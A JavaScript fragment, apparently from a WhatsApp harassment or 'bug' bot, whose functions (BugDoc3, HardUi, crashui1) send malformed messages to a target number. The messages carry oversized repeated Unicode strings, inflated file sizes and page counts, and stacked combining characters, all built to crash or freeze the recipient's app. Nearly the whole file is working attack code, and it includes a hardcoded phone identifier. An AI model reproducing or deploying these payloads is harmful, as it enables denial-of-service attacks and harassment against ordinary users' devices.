                      "/text/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0",
                    thumbnailSha256:
                      "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=",
                    thumbnailEncSha256:
                      "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=",
                    jpegThumbnail:
                      "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q==",
                    thumbnailHeight: 172,
                    thumbnailWidth: 480,
                  },
                  hasMediaAttachment: true,
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "ŦΛMZЏϾЯΛSH",
                        sections: [
                          {
                            title: "",
                            rows: [
                              {
                                title: "ŦΛMZЏϾЯΛSH0",
                                id: ".huii",
                              },
                            ],
                          },
                        ],
                      }),
                    },
                  ],
                },
                contextInfo: {
                  mentionedJid: target,
                  mentions: target,
                },
                disappearingMode: {
                  initiator: "INITIATED_BY_ME",
                  inviteLinkGroupTypeV2: "DEFAULT",
                  messageContextInfo: {
                    deviceListMetadata: {
                      senderTimestamp: "1678285396",
                      recipientKeyHash: "SV5H7wGIOXqPtg==",
                      recipientTimestamp: "1678496731",
                      deviceListMetadataVersion: 2,
                    },
                  },
                },
              },
            },
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
      await cella.relayMessage(
        target,
        {
          viewOnceMessage: {
            message: {
              locationMessage: {
                degreesLatitude: -21.980324912168495,
                degreesLongitude: 24.549921490252018,
                name: "ŦΛMZЏϾЯΛSH" + spamMessage,
                address: "",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAPwMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQEGAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAz2QAZ/Q57OSj+gLlnhnQdIBnhbzugXQZXcL6CF2XcIhqctQY3oMPokgQo6ArA2ZsVnlYUvnMq3lF7UfDKToz7SneaszZLzraR84aSDD7Jn//xAAhEAACAgIDAAMBAQAAAAAAAAABAgADBBESITETIkFRgf/aAAgBAQABPwAX2A2Op9MOSj1cbE7mEgqxy8NhsvDH+9RF12YGnFTLamPg3MnFONYFDbE+1liLx9MzXNVVdan8gdgVI/DEzlYaY9xbQRuJZyE5zKT5Mhj+ATGrUXDZ6EznJs3+RuvDOz3MXJRfo8+Sv1HE+xjsP2WMEfce5XUrv2MnoI6EJB8laAnuVUdgxelj1lpkE89Q7iO0ABGx/olNROyRE2hituW9IZah2TOBI7E48PYnEJsSm3YG4AGE4lfJk2a0sZuTdxiCpIjAOkLlQBqUOS2ojagOxMonmDOXsJHHqIdtLqSdESisq2yI2otnGZP2oVoDPNiBSBvUqO9SwdQGan//xAAdEQADAQADAAMAAAAAAAAAAAAAAQIRECExMkGB/9oACAECAQE/AMlpMXejivs2kydawnr0pKkWkvHpDOitzoeMldIw1OWNaR5+8P5cf//EAB0RAAIDAAIDAAAAAAAAAAAAAAERAAIQAxIgMVH/2gAIAQMBAT8Acpx2tXsIdZHowNwaPBF4M+Z//9k=",
              },
            },
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
      await cella.relayMessage(
        target,
        {
          botInvokeMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadataVersion: 2,
                deviceListMetadata: {},
              },
              interactiveMessage: {
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "payment_info",
                      buttonParamsJson:
                        '{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4PVSNK5RNNJ","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"🦄드림 가이 Zyn;","key":"🦄드림 가이 Zyn","key_type":"RANDOM"}}]}',
                    },
                  ],
                },
              },
            },
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
      await cella.relayMessage(
        target,
        {
          viewOnceMessage: {
            message: {
              liveLocationMessage: {
                degreesLatitude: 11111111,
                degreesLongitude: -111111,
                caption: "Lokasi Terkini" + spamMessage,
                url: "https://" + crashMessage + ".com",
                sequenceNumber: "1678556734042001",
                jpegThumbnail: null,
                expiration: 7776000,
                ephemeralSettingTimestamp: "1677306667",
                disappearingMode: {
                  initiator: "INITIATED_BY_ME",
                  inviteLinkGroupTypeV2: "DEFAULT",
                  messageContextInfo: {
                    deviceListMetadata: {
                      senderTimestamp: "1678285396",
                      recipientKeyHash: "SV5H7wGIOXqPtg==",
                      recipientTimestamp: "1678496731",
                      deviceListMetadataVersion: 2,
                    },
                  },
                },
                contextInfo: {
                  mentionedJid: target,
                  mentions: target,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "0@s.whatsapp.net",
                },
              },
            },
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }
async function BugDoc3(target) {
      let virtex = "BUG ERROR";

      cella.relayMessage(
        target,
        {
          groupMentionedMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                    fileLength: "999999999",
                    pageCount: 0x9184e729fff,
                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                    fileName: virtex,
                    fileEncSha256:
                      "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                    directPath:
                      "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1715880173",
                    contactVcard: true,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text:
                    "⚠️EROR⚠️" + "ꦾ".repeat(500000) + "@1".repeat(900000),
                },
                nativeFlowMessage: {},
                contextInfo: {
                  mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                  groupMentions: [
                    { groupJid: "1@newsletter", groupSubject: "FAMZYLEE" },
                  ],
                },
              },
            },
          },
        },
        { participant: { jid: target } }
      );
    }       

async function HardUi(target, ptcp = false) {
      await cella.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/text/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName:
                      "⭑̤▾ g͆Senkug̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g҉ ͆҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ Crag̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺  ▾⭑̤",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/text/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text:
                    " ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ𓍯̤𖣂  \u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g҉ ͆҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ҉          𖣂𓍯̤\n" +
                    "\n\n\n\n\n\n\n\n\n\n\n\n".repeat(27000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
                contextInfo: {
                  mentionedJid: ["2348127187030@s.whatsapp.net"],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/text/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/text/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/text/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
        target
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }                          
	async function crashui1(target, ptcp = false) {
    await cella.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "  ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ" + 